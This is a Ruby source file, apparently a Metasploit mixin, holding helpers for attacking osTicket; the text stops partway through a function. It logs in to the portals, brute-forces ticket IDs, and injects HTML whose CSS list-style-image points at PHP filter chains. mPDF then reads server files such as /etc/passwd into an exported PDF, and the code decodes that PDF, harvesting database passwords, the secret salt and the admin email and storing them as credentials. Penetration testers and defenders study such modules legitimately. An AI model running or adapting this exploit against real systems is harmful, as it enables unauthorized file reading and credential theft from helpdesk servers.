# -*- coding: binary -*-

require 'zlib'
require 'nokogiri'

##
# Shared helpers for osTicket auxiliary modules
##

module Msf
  # Shared mixin providing helpers for osTicket auxiliary modules:
  # HTTP authentication, CSRF extraction, PHP filter-chain payload generation,
  # PDF exfiltration parsing, and credential/note reporting.
  module Auxiliary::Osticket
    include Msf::Exploit::Remote::HttpClient
    include Msf::Exploit::Remote::HTTP::PhpFilterChain

    # Checks whether an HTTP response belongs to an osTicket installation.
    #
    # @param response [Rex::Proto::Http::Response] HTTP response
    # @return [Boolean]
    def osticket?(response)
      unless response
        vprint_error('osticket?: No response received (nil)')
        return false
      end
      vprint_status("osticket?: Response code=#{response.code}, body length=#{response.body.to_s.length}")
      unless response.code == 200
        vprint_error("osticket?: Non-200 response code: #{response.code}")
        return false
      end

      found = response.body.match?(/osTicket/i)
      vprint_status("osticket?: osTicket signature #{found ? 'FOUND' : 'NOT found'} in response body")
      found
    end

    # Extracts the __CSRFToken__ hidden field value from an osTicket HTML page.
    # Handles name-before-value, value-before-name, and single/double quotes.
    #
    # @param html [String] HTML response body
    # @return [String, nil] CSRF token value, or nil if not found
    def extract_csrf_token(html)
      vprint_status("extract_csrf_token: Searching HTML (#{html.to_s.length} bytes) for __CSRFToken__")
      [
        /name="__CSRFToken__"[^>]*value="([^"]+)"/,
        /value="([^"]+)"[^>]*name="__CSRFToken__"/,
        /name='__CSRFToken__'[^>]*value='([^']+)'/,
        /value='([^']+)'[^>]*name='__CSRFToken__'/
      ].each do |pattern|
        match = html.match(pattern)
        if match
          vprint_good("extract_csrf_token: Found token=#{match[1]}")
          return match[1]
        end
      end
      vprint_error('extract_csrf_token: No CSRF token found in HTML')
      nil
    end

    # Authenticates to the osTicket staff control panel (/scp/).
    #
    # @param base_uri [String] base path to osTicket (e.g. '/')
    # @param username [String] staff username
    # @param password [String] staff password
    # @return [String, nil] session cookies on success, nil on failure
    def osticket_login_scp(base_uri, username, password)
      login_uri = normalize_uri(base_uri, 'scp', 'login.php')
      vprint_status("osticket_login_scp: GET #{login_uri}")

      res = send_request_cgi('method' => 'GET', 'uri' => login_uri)
      unless res
        vprint_error('osticket_login_scp: No response from GET request (nil)')
        return nil
      end
      vprint_status("osticket_login_scp: GET response code=#{res.code}, cookies=#{res.get_cookies}")
      unless res.code == 200
        vprint_error("osticket_login_scp: Expected 200, got #{res.code}")
        return nil
      end

      csrf = extract_csrf_token(res.body)
      unless csrf
        vprint_error('osticket_login_scp: No CSRF token found, cannot POST login')
        return nil
      end

      cookies_for_post = res.get_cookies
      vprint_status("osticket_login_scp: POST #{login_uri} with userid=#{username}")
      res = send_request_cgi(
        'method' => 'POST',
        'uri' => login_uri,
        'cookie' => cookies_for_post,
        'vars_post' => {
          '__CSRFToken__' => csrf,
          'userid' => username,
          'passwd' => password
        }
      )
      unless res
        vprint_error('osticket_login_scp: No response from POST request (nil)')
        return nil
      end
      vprint_status("osticket_login_scp: POST response code=#{res.code}, url=#{res.headers['Location']}, body contains userid=#{res.body.downcase.include?('userid')}")

      if res.code == 302
        # 302 responses may not set new cookies; fall back to the GET cookies
        # which already contain the authenticated OSTSESSID
        session_cookies = res.get_cookies
        session_cookies = cookies_for_post if session_cookies.empty?
        vprint_good('osticket_login_scp: Login SUCCESS')
        return session_cookies
      end

      if res.code == 200 && !res.body.downcase.include?('userid')
        vprint_good("osticket_login_scp: Login SUCCESS (200 without login form), cookies=#{cookies_for_post}")
        return cookies_for_post
      end

      vprint_error('osticket_login_scp: Login FAILED (still see login form)')
      nil
    end

    # Authenticates to the osTicket client portal.
    #
    # @param base_uri [String] base path to osTicket (e.g. '/')
    # @param username [String] client email
    # @param password [String] client password
    # @param login_path [String] login path (default: 'login.php')
    #
    # @return [String, nil] session cookies on success, nil on failure
    #
    def osticket_login_client(base_uri, username, password, login_path = 'login.php')
      login_uri = normalize_uri(base_uri, login_path)
      vprint_status("osticket_login_client: GET #{login_uri}")

      res = send_request_cgi('method' => 'GET', 'uri' => login_uri)
      unless res
        vprint_error('osticket_login_client: No response from GET request (nil)')
        return nil
      end
      vprint_status("osticket_login_client: GET response code=#{res.code}, cookies=#{res.get_cookies}")
      unless res.code == 200
        vprint_error("osticket_login_client: Expected 200, got #{res.code}")
        return nil
      end

      csrf = extract_csrf_token(res.body)
      unless csrf
        vprint_error('osticket_login_client: No CSRF token found, cannot POST login')
        return nil
      end

      cookies_for_post = res.get_cookies
      vprint_status("osticket_login_client: POST #{login_uri} with luser=#{username}")
      res = send_request_cgi(
        'method' => 'POST',
        'uri' => login_uri,
        'cookie' => cookies_for_post,
        'vars_post' => {
          '__CSRFToken__' => csrf,
          'luser' => username,
          'lpasswd' => password
        }
      )
      unless res
        vprint_error('osticket_login_client: No response from POST request (nil)')
        return nil
      end
      vprint_status("osticket_login_client: POST response code=#{res.code}, body contains luser=#{res.body.include?('luser')}")

      if res.code == 302
        # 302 responses may not set new cookies; fall back to the GET cookies
        # which already contain the authenticated OSTSESSID
        session_cookies = res.get_cookies
        session_cookies = cookies_for_post if session_cookies.empty?
        vprint_good('osticket_login_client: Login SUCCESS')
        return session_cookies
      end

      if res.code == 200 && !res.body.include?('luser')
        vprint_good("osticket_login_client: Login SUCCESS (200 without login form), cookies=#{cookies_for_post}")
        return cookies_for_post
      end

      vprint_error('osticket_login_client: Login FAILED (still see login form)')
      nil
    end

    # Resolves a user-visible ticket number to the internal numeric ticket ID
    # used in tickets.php?id= parameters.
    #
    # @param base_uri      [String] base path to osTicket
    # @param prefix        [String] portal prefix ('/scp' or '')
    # @param ticket_number [String] visible ticket number (e.g. '978554')
    # @param cookies       [String] session cookies
    # @return [String, nil] internal ticket ID or nil
    def find_ticket_id(base_uri, prefix, ticket_number, cookies, max_id)
      tickets_uri = normalize_uri(base_uri, prefix, 'tickets.php')
      vprint_status("find_ticket_id: GET #{tickets_uri} (looking for ticket ##{ticket_number})")
      vprint_status("find_ticket_id: Using cookies=#{cookies}")

      res = send_request_cgi(
        'method' => 'GET',
        'uri' => tickets_uri,
        'cookie' => cookies
      )
      unless res
        vprint_error('find_ticket_id: No response from ticket listing (nil)')
        return nil
      end
      vprint_status("find_ticket_id: Ticket listing response code=#{res.code}, body=#{res.body.to_s.length} bytes")
      vprint_status("find_ticket_id: Body Length:\n#{res.body.length}")
      return nil unless res.code == 200

      match = res.body.match(/tickets\.php\?id=(\d+)[^>]*>.*?#?#{Regexp.escape(ticket_number.to_s)}/m)
      if match
        vprint_good("find_ticket_id: Found ticket ID=#{match[1]} from listing page")
        return match[1]
      end
      vprint_status("find_ticket_id: Ticket ##{ticket_number} not found in listing, trying brute-force IDs 1-#{max_id}...")

      # Brute-force first N IDs as fallback
      (1..max_id).each do |tid|
        vprint_status("find_ticket_id: Trying id=#{tid}")
        res = send_request_cgi(
          'method' => 'GET',
          'uri' => tickets_uri,
          'cookie' => cookies,
          'vars_get' => { 'id' => tid.to_s }
        )
        if res&.code == 200 && res.body.include?(ticket_number.to_s)
          vprint_good("find_ticket_id: Found ticket ##{ticket_number} at id=#{tid}")
          return tid.to_s
        end
      end

      vprint_error("find_ticket_id: Could not locate ticket ##{ticket_number}")
      nil
    end

    # Acquires a ticket lock via the SCP AJAX endpoint, which is required
    # before submitting a reply on the staff panel.
    #
    # @param base_uri  [String] base path to osTicket
    # @param ticket_id [String] internal ticket ID
    # @param cookies   [String] session cookies
    # @return [String] lock code, or empty string if unavailable
    def acquire_lock_code(base_uri, ticket_id, cookies)
      lock_uri = normalize_uri(base_uri, 'scp', 'ajax.php', 'lock', 'ticket', ticket_id.to_s)
      vprint_status("acquire_lock_code: POST #{lock_uri}")
      res = send_request_cgi(
        'method' => 'POST',
        'uri' => lock_uri,
        'cookie' => cookies,
        'headers' => { 'X-Requested-With' => 'XMLHttpRequest' }
      )
      return '' unless res&.code == 200

      begin
        data = JSON.parse(res.body)
        if data['code']
          vprint_good('acquire_lock_code: Got lock code from JSON response')
          return data['code'].to_s
        end
      rescue JSON::ParserError
        vprint_status('acquire_lock_code: Response is not JSON, trying plain text')
      end

      # Sometimes returned as plain text
      text = res.body.to_s.strip
      return text if text.length < 30

      vprint_warning('acquire_lock_code: Could not parse lock code, reply may fail')
      ''
    end

    # Submits an HTML payload as a ticket reply. The payload is injected into
    # the reply body and will be rendered by mPDF when the ticket PDF is exported.
    #
    # @param base_uri     [String] base path to osTicket
    # @param prefix       [String] portal prefix ('/scp' or '')
    # @param ticket_id    [String] internal ticket ID
    # @param html_content [String] HTML payload to inject
    # @param cookies      [String] session cookies
    # @return [Boolean] true if the reply was accepted
    def submit_ticket_reply(base_uri, prefix, ticket_id, html_content, cookies)
      ticket_uri = normalize_uri(base_uri, prefix, 'tickets.php')

      # SCP requires acquiring a lock before loading the reply page
      lock_code = prefix == '/scp' ? acquire_lock_code(base_uri, ticket_id, cookies) : ''

      vprint_status("submit_ticket_reply: GET #{ticket_uri}?id=#{ticket_id} to fetch CSRF token")
      res = send_request_cgi(
        'method' => 'GET',
        'uri' => ticket_uri,
        'cookie' => cookies,
        'vars_get' => { 'id' => ticket_id }
      )
      unless res
        vprint_error('submit_ticket_reply: No response from ticket page (nil)')
        return false
      end
      vprint_status("submit_ticket_reply: GET response code=#{res.code}, body=#{res.body.to_s.length} bytes")
      return false unless res.code == 200

      csrf = extract_csrf_token(res.body)
      unless csrf
        vprint_error('submit_ticket_reply: No CSRF token found on ticket page')
        return false
      end

      textarea_name = detect_reply_textarea(res.body, prefix)
      vprint_status("submit_ticket_reply: Using textarea field '#{textarea_name}', payload=#{html_content.length} bytes")

      post_vars = if prefix == '/scp'
                    # Parse from_email_id from the page (default "1" if not found)
                    from_email_id = '1'
                    email_match = res.body.match(/name="from_email_id"[^>]*value="([^"]*)"/) ||
                                  res.body.match(/value="([^"]*)"[^>]*name="from_email_id"/)
                    from_email_id = email_match[1] if email_match

                    # Fall back to parsing lockCode from page HTML if AJAX didn't return one
                    if lock_code.empty?
                      lc_match = res.body.match(/name="lockCode"[^>]*value="([^"]+)"/) ||
                                 res.body.match(/value="([^"]+)"[^>]*name="lockCode"/)
                      lock_code = lc_match[1] if lc_match
                    end

                    {
                      '__CSRFToken__' => csrf,
                      'id' => ticket_id,
                      'msgId' => '',
                      'a' => 'reply',
                      'lockCode' => lock_code.to_s,
                      'from_email_id' => from_email_id,
                      'reply-to' => 'all',
                      'cannedResp' => '0',
                      'draft_id' => '',
                      textarea_name => html_content,
                      'signature' => 'none',
                      'reply_status_id' => '1'
                    }
                  else
                    {
                      '__CSRFToken__' => csrf,
                      'id' => ticket_id,
                      'a' => 'reply',
                      textarea_name => html_content
                    }
                  end

      vprint_status("submit_ticket_reply: POST #{ticket_uri} with a=reply, id=#{ticket_id}")
      res = send_request_cgi(
        'method' => 'POST',
        'uri' => ticket_uri,
        'cookie' => cookies,
        'vars_post' => post_vars
      )
      unless res
        vprint_error('submit_ticket_reply: No response from POST reply (nil)')
        return false
      end
      vprint_status("submit_ticket_reply: POST response code=#{res.code}, body=#{res.body.to_s.length} bytes")

      # A 302 redirect after POST indicates the reply was accepted (osTicket redirects on success)
      if res.code == 302
        vprint_good('submit_ticket_reply: Got 302 redirect - reply accepted')
        return true
      end

      success = %w[reply\ posted posted\ successfully message\ posted response\ posted].any? do |indicator|
        res.body.downcase.include?(indicator)
      end
      vprint_status("submit_ticket_reply: Success indicators found=#{success}")
      success
    end

    # Downloads the PDF export of a ticket. Tries multiple known URL patterns.
    #
    # @param base_uri  [String] base path to osTicket
    # @param prefix    [String] portal prefix ('/scp' or '')
    # @param ticket_id [String] internal ticket ID
    # @param cookies   [String] session cookies
    # @return [String, nil] raw PDF bytes, or nil on failure
    def download_ticket_pdf(base_uri, prefix, ticket_id, cookies, max_redirects = 3)
      base = normalize_uri(base_uri, prefix, 'tickets.php')
      vprint_status("download_ticket_pdf: Trying PDF export from #{base}")

      [
        { 'a' => 'print', 'id' => ticket_id },
        { 'a' => 'print', 'id' => ticket_id, 'pdf' => 'true' },
        { 'id' => ticket_id, 'a' => 'print' }
      ].each do |params|
        query = params.map { |k, v| "#{k}=#{v}" }.join('&')
        vprint_status("download_ticket_pdf: GET #{base}?#{query}")
        res = send_request_cgi!(
          { 'method' => 'GET', 'uri' => base, 'cookie' => cookies, 'vars_get' => params },
          20,
          max_redirects
        )
        unless res
          vprint_error("download_ticket_pdf: No response (nil) for params=#{params}")
          next
        end

        content_type = res.headers['Content-Type'] || ''
        magic = res.body[0, 4].to_s
        vprint_status("download_ticket_pdf: Response code=#{res.code}, Content-Type=#{content_type}, magic=#{magic.inspect}, size=#{res.body.length}")

        if content_type.start_with?('application/pdf') || magic == '%PDF'
          vprint_good("download_ticket_pdf: Got PDF (#{res.body.length} bytes)")
          return res.body
        else
          vprint_warning('download_ticket_pdf: Not a PDF response')
        end
      end

      vprint_error('download_ticket_pdf: All PDF URL patterns failed')
      nil
    end

    # Builds a minimal 24-bit BMP file header used as a carrier for
    # exfiltrated data. mPDF renders it as an image whose pixel data
    # contains the leaked file content after the ISO-2022-KR escape marker.
    #
    # @param width  [Integer] BMP width in pixels (default 15000)
    # @param height [Integer] BMP height in pixels (default 1)
    # @return [String] raw BMP header bytes
    def generate_bmp_header(width = 15000, height = 1)
      header = "BM:\x00\x00\x00\x00\x00\x00\x006\x00\x00\x00(\x00\x00\x00".b
      header << [width].pack('V')
      header << [height].pack('V')
      header << "\x01\x00\x18\x00\x00\x00\x00\x00\x04\x00\x00\x00".b
      header << "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00".b
      header
    end

    # Generates a PHP filter chain URI that reads a target file and prepends
    # a BMP header so the result embeds as an image in the PDF.
    #
    # @param file_path [String] remote file path to read
    # @param encoding  [String] 'plain', 'b64', or 'b64zlib'
    # @return [String] the php://filter/... URI
    def generate_php_filter_payload(file_path, encoding = 'plain')
      b64_payload = Rex::Text.encode_base64(generate_bmp_header)

      filters = 'convert.iconv.UTF8.CSISO2022KR|'
      filters << 'convert.base64-encode|'
      filters << 'convert.iconv.UTF8.UTF7|'

      b64_payload.reverse.each_char do |c|
        mapping = CONVERSIONS[c]
        next if mapping.nil? || mapping.empty?

        filters << mapping << '|'
        filters << 'convert.base64-decode|'
        filters << 'convert.base64-encode|'
        filters << 'convert.iconv.UTF8.UTF7|'
      end

      filters << 'convert.base64-decode'

      case encoding
      when 'b64'
        filters = 'convert.base64-encode|' + filters
      when 'b64zlib'
        filters = 'zlib.deflate|convert.base64-encode|' + filters
      end

      "php://filter/#{filters}/resource=#{file_path}"
    end

    # URL-encodes a string, forcing uppercase ASCII letters to percent-encoded
    # form. Necessary because osTicket/mPDF/htmLawed lowercases unencoded path
    # components, breaking case-sensitive iconv charset names.
    #
    # @param input_string [String] string to encode
    # @return [String] URL-encoded string
    def quote_with_forced_uppercase(input_string)
      safe_chars = ('a'..'z').to_a + ('0'..'9').to_a + ['_', '.', '-', '~']
      input_string.chars.map do |char|
        if char >= 'A' && char <= 'Z'
          format('%%%X', char.ord)
        elsif safe_chars.include?(char)
          char
        else
          Rex::Text.uri_encode(char)
        end
      end.join
    end

    # Generates the HTML payload for injection into an osTicket ticket.
    # Each file to read becomes a <li> element whose list-style-image CSS
    # property points to a PHP filter chain URI, triggering mPDF to process it.
    #
    # @param file_specs [Array<String>, Array<Hash>] file paths to read.
    #   Strings may include encoding suffix: "/etc/passwd:b64zlib".
    #   Hashes should have :path and optionally :encoding keys.
    # @param is_reply [Boolean] true for ticket reply, false for ticket creation
    # @return [String] HTML payload
    def generate_ticket_payload(file_specs, is_reply: true)
      sep = is_reply ? '&#38;&#35;&#51;&#52;' : '&#34'

      payloads = Array(file_specs).map do |spec|
        if spec.is_a?(Hash)
          generate_php_filter_payload(spec[:path], spec[:encoding] || 'plain')
        elsif spec.include?(',')
          path, enc = spec.split(',', 2)
          enc = 'plain' unless %w[plain b64 b64zlib].include?(enc)
          generate_php_filter_payload(path, enc)
        else
          generate_php_filter_payload(spec)
        end
      end

      html = '<ul>'
      payloads.each do |p|
        html << "<li style=\"list-style-image:url#{sep}(#{quote_with_forced_uppercase(p)})\">listitem</li>\n"
      end
      html << '</ul>'
      html
    end

    # Wraps a raw PHP filter chain URI in the
    # osTicket HTML injection format for delivery via ticket reply.
    #
    # @param filter_uri [String] php://filter/... URI
    # @param is_reply   [Boolean] true for ticket reply payload
    # @return [String] HTML payload
    def wrap_filter_as_ticket_payload(filter_uri, is_reply: true)
      sep = is_reply ? '&#38;&#35;&#51;&#52;' : '&#34'
      "<ul><li style=\"list-style-image:url#{sep}(#{quote_with_forced_uppercase(filter_uri)})\">listitem</li></ul>"
    end

    # Extracts exfiltrated file contents from a PDF generated by mPDF.
    #
    # mPDF embeds our BMP payload as a PDF image XObject, converting the
    # pixel data from BMP's BGR byte order to PDF's RGB byte order. To find
    # the ISO-2022-KR marker, we must convert the image data back to BGR.
    #
    # This mirrors what the Python PoC does with PyMuPDF + Pillow:
    #   pix = fitz.Pixmap(pdf_doc, xref)       # extract image (RGB)
    #   pil_image.save(bmp_buffer, "BMP")       # convert to BMP (BGR)
    #   extract_data_from_bmp(bmp_data)          # find marker in BGR data
    #
    # @param pdf_data [String] raw PDF bytes
    # @return [Array<String>] array of extracted file contents
    def extract_files_from_pdf(pdf_data)
      vprint_status("extract_files_from_pdf: Processing PDF (#{pdf_data.length} bytes)")
      results = []

      # Primary: Extract image XObjects, swap RGB for BGR, search for marker
      image_streams = extract_pdf_image_streams(pdf_data)
      vprint_status("extract_files_from_pdf: Found #{image_streams.length} image XObject streams")

      image_streams.each_with_index do |img_data, idx|
        # Swap RGB for BGR to restore original BMP pixel byte order
        bgr_data = swap_rgb_bgr(img_data)
        vprint_status("extract_files_from_pdf: Image ##{idx}: #{img_data.length} bytes, swapped to BGR")

        # Try BGR-swapped data first; fall back to raw if swap didn't help
        content = extract_data_from_bmp_stream(bgr_data)
        content ||= extract_data_from_bmp_stream(img_data)
        next unless content && !content.empty?

        clean = content.sub(/\x00+\z/, ''.b)
        pad_idx = clean.index('@C>=='.b)
        clean = clean[0...pad_idx] if pad_idx && pad_idx > 0
        unless clean.empty?
          vprint_good("extract_files_from_pdf: Image ##{idx} yielded #{clean.length} bytes of extracted data")
          results << clean
        end
      end

      # Fallback: scan all streams directly (catches data not in XObjects or where
      # BGR swap wasn't needed). Always runs so partial primary results aren't final.
      streams = extract_pdf_streams(pdf_data)
      vprint_status("extract_files_from_pdf: Fallback - scanning #{streams.length} raw streams")

      streams.each_with_index do |stream, idx|
        content = extract_data_from_bmp_stream(stream)
        next unless content && !content.empty?

        clean = content.sub(/\x00+\z/, ''.b)
        pad_idx = clean.index('@C>=='.b)
        clean = clean[0...pad_idx] if pad_idx && pad_idx > 0
        next if clean.empty?

        # Skip duplicates already found by the primary XObject path
        next if results.any? { |r| r == clean }

        vprint_good("extract_files_from_pdf: Stream ##{idx} yielded #{clean.length} bytes of extracted data")
        results << clean
      end

      vprint_status("extract_files_from_pdf: Total extracted files: #{results.length}")
      results
    end

    # Finds image XObject streams in the PDF and returns their decompressed data.
    # Parses the raw PDF to locate objects with /Subtype /Image, then extracts
    # and decompresses their stream content.
    #
    # @param pdf_data [String] raw PDF bytes
    # @return [Array<String>] array of decompressed image stream data
    def extract_pdf_image_streams(pdf_data)
      pdf_data = pdf_data.dup.force_encoding('ASCII-8BIT')
      images = []

      # Find all object start positions
      obj_starts = []
      pdf_data.scan(/\d+\s+\d+\s+obj\b/) do
        obj_starts << Regexp.last_match.begin(0)
      end

      obj_starts.each_with_index do |obj_start, i|
        # Determine object boundary (up to next obj or end of file)
        obj_end = i + 1 < obj_starts.length ? obj_starts[i + 1] : pdf_data.length
        obj_data = pdf_data[obj_start...obj_end]

        # Only process image XObjects
        next unless obj_data.match?(%r{/Subtype\s*/Image})

        # Find stream data within this object
        stream_idx = obj_data.index('stream')
        next unless stream_idx

        # Skip past "stream" keyword + newline delimiter
        data_start = stream_idx + 6
        data_start += 1 if data_start < obj_data.length && obj_data[data_start] == "\r".b
        data_start += 1 if data_start < obj_data.length && obj_data[data_start] == "\n".b

        endstream_idx = obj_data.index('endstream', data_start)
        next unless endstream_idx

        stream_data = obj_data[data_start...endstream_idx]
        stream_data = stream_data.sub(/\r?\n?\z/, '')

        # Decompress if FlateDecode filter is applied
        if obj_data.match?(%r{/Filter\s*/FlateDecode}) || obj_data.match?(%r{/Filter\s*\[.*?/FlateDecode})
          begin
            decompressed = Zlib::Inflate.inflate(stream_data)
          rescue Zlib::DataError, Zlib::BufError
            decompressed = stream_data
          end
        else
          decompressed = stream_data
        end

        vprint_status("extract_pdf_image_streams: Found image object (#{decompressed.length} bytes decompressed)")
        images << decompressed
      end

      images
    end

    # Swaps byte order in every 3-byte triplet: [R,G,B] to [B,G,R].
    # This reverses the BGR / RGB conversion that mPDF performs when
    # embedding BMP pixel data into a PDF image XObject.
    #
    # @param data [String] RGB pixel data
    # @return [String] BGR pixel data
    def swap_rgb_bgr(data)
      s = data.dup.force_encoding('ASCII-8BIT')
      len = s.length
      lim = len - (len % 3) # process only complete RGB triplets

      i = 0
      while i < lim
        # direct byte swap using getbyte / setbyte is fastest in CRuby
        r = s.getbyte(i)
        b = s.getbyte(i + 2)
        s.setbyte(i, b)
        s.setbyte(i + 2, r)
        i += 3
      end
      s
    end

    # Extracts and decompresses all stream objects from raw PDF data.
    # Most PDF streams use FlateDecode (zlib).
    #
    # @param pdf_data [String] raw PDF bytes
    # @return [Array<String>] array of decompressed stream contents
    def extract_pdf_streams(pdf_data)
      streams = []
      pos = 0

      while (start_idx = pdf_data.index('stream', pos))
        data_start = start_idx + 6
        data_start += 1 if data_start < pdf_data.length && pdf_data[data_start] == "\r"
        data_start += 1 if data_start < pdf_data.length && pdf_data[data_start] == "\n"

        end_idx = pdf_data.index('endstream', data_start)
        break unless end_idx

        stream_data = pdf_data[data_start...end_idx].sub(/\r?\n?\z/, '')

        begin
          streams << Zlib::Inflate.inflate(stream_data)
        rescue Zlib::DataError, Zlib::BufError
          streams << stream_data
        end

        pos = end_idx + 9
      end

      streams
    end

    def looks_like_base64?(str)
      return false if str.length < 12 || str.length % 4 != 0

      cleaned = str.tr('A-Za-z0-9+/=', '')
      cleaned.empty?
    end

    # Extracts file data from a stream containing BMP pixel data.
    # Looks for the ISO-2022-KR escape sequence marker (\x1b$)C),
    # strips null bytes, and decodes (base64 + optional zlib).
    #
    # @param raw_data [String] raw stream bytes
    # @return [String, nil] extracted file content, or nil
    def extract_data_from_bmp_stream(raw_data)
      marker = "\x1b$)C".b
      idx = raw_data.index(marker)
      unless idx
        # Not a BMP stream with our marker - this is expected for most PDF streams
        return nil
      end

      vprint_status("extract_data_from_bmp_stream: ISO-2022-KR marker found at offset #{idx} in #{raw_data.length}-byte stream")
      data = raw_data[(idx + marker.length)..].gsub("\x00".b, ''.b)
      if data.empty?
        vprint_warning('extract_data_from_bmp_stream: No data after marker (empty after null-strip)')
        return nil
      end
      vprint_status("extract_data_from_bmp_stream: #{data.length} bytes after marker (nulls stripped)")

      # Add this block here: Preview the data to see if it's base64 or plain text
      preview_len = 96
      preview = data[0, preview_len]
      vprint_status("First #{preview_len} bytes of data after marker and null-strip:")
      vprint_status("  ascii: #{preview.gsub(/[^\x20-\x7e]/, '.').inspect}")
      vprint_status("  hex:   #{preview.unpack1('H*').scan(/../).join(' ')}")

      vprint_status("Data looks like base64? #{looks_like_base64?(data)}")

      # Conditional processing based on whether it's base64
      if looks_like_base64?(data)
        b64_decoded = decode_b64_permissive(data)
        vprint_status("extract_data_from_bmp_stream: b64 decoded=#{b64_decoded.length} bytes")

        # Preview decoded if successful
        if !b64_decoded.empty?
          dec_preview = b64_decoded[0, 96]
          vprint_status('First 96 bytes of b64_decoded:')
          vprint_status("  ascii: #{dec_preview.gsub(/[^\x20-\x7e]/, '.').inspect}")
          vprint_status("  hex:   #{dec_preview.unpack1('H*').scan(/../).join(' ')}")
        end

        decompressed = decompress_raw_deflate(b64_decoded)
        vprint_status("extract_data_from_bmp_stream: zlib decompressed=#{decompressed.length} bytes")

        # Preview decompressed if any
        if !decompressed.empty?
          zlib_preview = decompressed[0, 96]
          vprint_status('First 96 bytes of decompressed:')
          vprint_status("  ascii: #{zlib_preview.gsub(/[^\x20-\x7e]/, '.').inspect}")
          vprint_status("  hex:   #{zlib_preview.unpack1('H*').scan(/../).join(' ')}")
        end

        return decompressed unless decompressed.empty?
        return b64_decoded unless b64_decoded.empty?
      else
        # For plain, preview the data itself
        vprint_status('Treating as plain (non-base64) - preview:')
        vprint_status("  ascii: #{data[0, 96].gsub(/[^\x20-\x7e]/, '.').inspect}")
        vprint_status("  hex:   #{data[0, 96].unpack1('H*').scan(/../).join(' ')}")
      end
      data
    end

    # Best-effort base64 decoding in 4-byte blocks. Falls back to cleaning
    # the input as printable ASCII if decoded output is below min_bytes
    # (indicating the data was probably plaintext, not base64).
    #
    # @param data      [String] raw bytes to decode
    # @param min_bytes [Integer] minimum decoded length to consider valid
    # @return [String] decoded bytes or cleaned plaintext
    def decode_b64_permissive(data, min_bytes = 12)
      data = data.strip
      decoded = ''.b
      i = 0

      while i < data.length
        block = data[i, 4]
        # Stop at non-base64 characters (matches Python's validate=True behavior)
        break unless block.match?(%r{\A[A-Za-z0-9+/=]+\z})

        begin
          decoded << Rex::Text.decode_base64(block)
        rescue StandardError
          break
        end
        i += 4
      end

      decoded.length < min_bytes ? clean_unprintable_bytes(data) : decoded
    end

    # Decompresses raw deflate data (no zlib header) in chunks, tolerating
    # truncated or corrupted streams.
    #
    # @param data       [String] raw deflate-compressed bytes
    # @param chunk_size [Integer] decompression chunk size
    # @return [String] decompressed bytes (may be partial)
    def decompress_raw_deflate(data, chunk_size = 1024)
      return ''.b if data.nil? || data.empty?

      inflater = Zlib::Inflate.new(-Zlib::MAX_WBITS)
      output = ''.b
      i = 0

      while i < data.length
        begin
          output << inflater.inflate(data[i, chunk_size])
        rescue Zlib::DataError, Zlib::BufError
          begin
            output << inflater.flush_next_out
          rescue StandardError
            nil
          end
          break
        end
        i += chunk_size
      end

      begin
        output << inflater.finish
      rescue StandardError
        nil
      end
      inflater.close
      output
    end

    # Strips non-printable ASCII characters, keeping 0x20-0x7E and whitespace.
    #
    # @param data [String] raw bytes
    # @return [String] cleaned ASCII bytes
    def clean_unprintable_bytes(data)
      data.encode('ASCII', invalid: :replace, undef: :replace, replace: '')
          .gsub(/[^\x20-\x7E\n\r\t]/, '').b
    end

    # Searches extracted file contents for osTicket configuration secrets and reports them.
    # Prints a KEY FINDINGS block and stores credentials/notes to the database.
    # Works regardless of which portal (SCP or client) was used to authenticate.
    #
    # @param extracted [Array<String>] raw file contents extracted from the PDF
    def report_secrets(extracted)
      secret_patterns = {
        'SECRET_SALT' => /define\('SECRET_SALT','([^']+)'\)/,
        'ADMIN_EMAIL' => /define\('ADMIN_EMAIL','([^']+)'\)/,
        'DBTYPE' => /define\('DBTYPE','([^']+)'\)/,
        'DBHOST' => /define\('DBHOST','([^']+)'\)/,
        'DBNAME' => /define\('DBNAME','([^']+)'\)/,
        'DBUSER' => /define\('DBUSER','([^']+)'\)/,
        'DBPASS' => /define\('DBPASS','([^']+)'\)/
      }

      found_any = false

      extracted.each do |content|
        text = begin
          content.encode('UTF-8', 'binary', invalid: :replace, undef: :replace, replace: '')
        rescue StandardError
          next
        end

        secret_patterns.each do |key, pattern|
          match = text.match(pattern)
          next unless match

          unless found_any
            print_line
            print_line('=' * 70)
            print_line('KEY FINDINGS')
            print_line('=' * 70)
            found_any = true
          end
          print_good("  #{key}: #{match[1]}")

          case key
          when 'DBPASS'
            db_user_match = text.match(/define\('DBUSER','([^']+)'\)/)
            if db_user_match
              db_host_val = text.match(/define\('DBHOST','([^']+)'\)/)&.[](1) || rhost
              db_type_val = text.match(/define\('DBTYPE','([^']+)'\)/)&.[](1)&.downcase

              if db_host_val =~ /\A(.+):(\d+)\z/
                db_address = ::Regexp.last_match(1)
                db_port = ::Regexp.last_match(2).to_i
              else
                db_address = db_host_val
                db_port = case db_type_val
                          when 'mysql' then 3306
                          when 'pgsql', 'postgres' then 5432
                          when 'mssql' then 1433
                          else 3306
                          end
              end

              report_cred(db_user_match[1], match[1], 'osTicket database', address: db_address, port: db_port)
            end
          when 'ADMIN_EMAIL'
            report_note(host: rhost, port: rport, type: 'osticket.admin_email', data: { email: match[1] })
          when 'SECRET_SALT'
            report_note(host: rhost, port: rport, type: 'osticket.secret_salt', data: { salt: match[1] })
          end
        end
      end
    end

    # Reports a credential pair to the Metasploit database.
    #
    # @param username     [String] credential username
    # @param password     [String] credential password
    # @param service_name [String] service label (e.g. 'osTicket database')
    # @param address      [String] host address for the credential (defaults to rhost)
    # @param port         [Integer] port for the credential (defaults to rport)
    def report_cred(username, password, service_name, address: rhost, port: rport)
      create_credential(
        module_fullname: fullname,
        workspace_id: myworkspace_id,
        origin_type: :service,
        address: address,
        port: port,
        protocol: 'tcp',
        service_name: service_name,
        username: username,
        private_data: password,
        private_type: :password
      )
    rescue StandardError => e
      vprint_error("Failed to store credential: #{e}")
    end

    # Extracts the first usable topicId from the static open.php HTML.
    #
    # NOTE: osTicket loads the subject/message form fields dynamically via AJAX
    # (ajax.php/form/help-topic/{id}) when a topic is chosen, they are NOT in
    # the initial open.php response. Call fetch_topic_form_fields separately.
    #
    # @param html [String] HTML of open.php
    # @return [String] topicId value (first non-empty option, defaults to '1')
    def detect_open_form_fields(html)
      doc = Nokogiri::HTML(html)

      topic_select = doc.at('select[@name="topicId"]') || doc.at('select[@id="topicId"]')
      # Skip the blank placeholder option ("-- Select a Help Topic --")
      topic_id = topic_select&.search('option')
                             &.find { |o| !o['value'].to_s.empty? }
                              &.[]('value') || '1'

